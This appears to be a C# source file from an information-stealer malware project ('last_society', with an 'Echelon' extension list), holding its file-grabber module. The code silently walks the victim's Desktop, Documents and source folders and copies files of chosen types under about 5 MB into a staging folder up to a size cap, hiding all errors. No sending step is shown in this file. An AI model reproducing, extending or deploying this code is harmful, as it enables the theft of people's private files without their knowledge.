using System;
using System.Collections.Generic;
using System.IO;

namespace last_society
{
    public partial class GetFiles
    {
        public static int count = 0;
        public static void Inizialize(string lastsociety)
        {
            try
            {
                string Files = lastsociety + "\\Files";
                Directory.CreateDirectory(Files);
                if (!Directory.Exists(Files))
                {
                    Inizialize(Files);
                }
                else
                {
                    
                    CopyDirectory(Help.DesktopPath, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.MyDocuments, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.UserProfile + "\\source", Files, "*.*", Program.FileSize);

                       
                }
            }
            catch { }
        }
        private static long GetDirSize(string path, long size = 0)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(path))
                {
                    try
                    {
                        size += new FileInfo(file).Length;
                        
                    }
                    catch  { }
                }
                foreach (string dir in Directory.EnumerateDirectories(path))
                {
                    try
                    {
                        size += GetDirSize(dir);
                    }
                    catch  { }
                }
            }
            catch  { }
            return size;
        }

        public static void CopyDirectory(string source, string target, string pattern, long maxSize)
        {
            var stack = new Stack<Folders>();
            stack.Push(new Folders(source, target));
            long size = GetDirSize(target);
            while (stack.Count > 0)

            {
                Folders folders = stack.Pop();
                try
                {
                    Directory.CreateDirectory(folders.Target);
                    foreach (string file in Directory.EnumerateFiles(folders.Source, pattern))
                    {
                        try
                        {
                            if (Array.IndexOf(Program.Echelon_Size, Path.GetExtension(file).ToLower()) < 0)
                            {
                                continue;
                            }
                            string targetPath = Path.Combine(folders.Target, Path.GetFileName(file));
                            if (new FileInfo(file).Length / 0x400 < 0x1388) // 1024 < 5000
                            {
                                File.Copy(file, targetPath);
                                size += new FileInfo(targetPath).Length;
                                if (size > maxSize)
                                {
                                    return;
                                }
                                count++;
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (PathTooLongException) { continue; }
                try
                {
                    foreach (string folder in Directory.EnumerateDirectories(folders.Source))
                    {
                        try
                        {
                            if (!folder.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
                            {
                                stack.Push(new Folders(folder, Path.Combine(folders.Target, Path.GetFileName(folder))));
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (DirectoryNotFoundException) { continue; }
                catch  (PathTooLongException) { continue; }
            }
            stack.Clear();
        }
    }
}
